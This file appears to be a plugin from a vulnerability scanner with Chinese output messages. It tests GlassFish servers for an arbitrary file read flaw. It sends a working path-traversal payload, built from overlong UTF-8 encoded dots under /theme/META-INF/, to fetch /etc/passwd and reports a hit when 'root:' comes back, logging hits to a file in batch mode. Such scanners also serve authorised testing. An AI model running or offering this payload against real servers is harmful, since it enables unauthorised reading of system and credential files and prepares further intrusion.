#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests
from libs.output import OutPutFile

class GlassFish_File_Read_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:" in req.text:
                OutPrintInfoSuc("GlassFish", f"存在GlassFish任意文件读取 {url2}")
                if self.batch:
                    OutPutFile("glassfish_file_read.txt",f"存在GlassFish任意文件读取 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("GlassFish", "不存在GlassFish任意文件读取")
        except Exception:
            if not self.batch:
                OutPrintInfo("GlassFish", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("GlassFish", "开始检测GlassFish任意文件读取...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("GlassFish", "GlassFish任意文件读取检测结束")
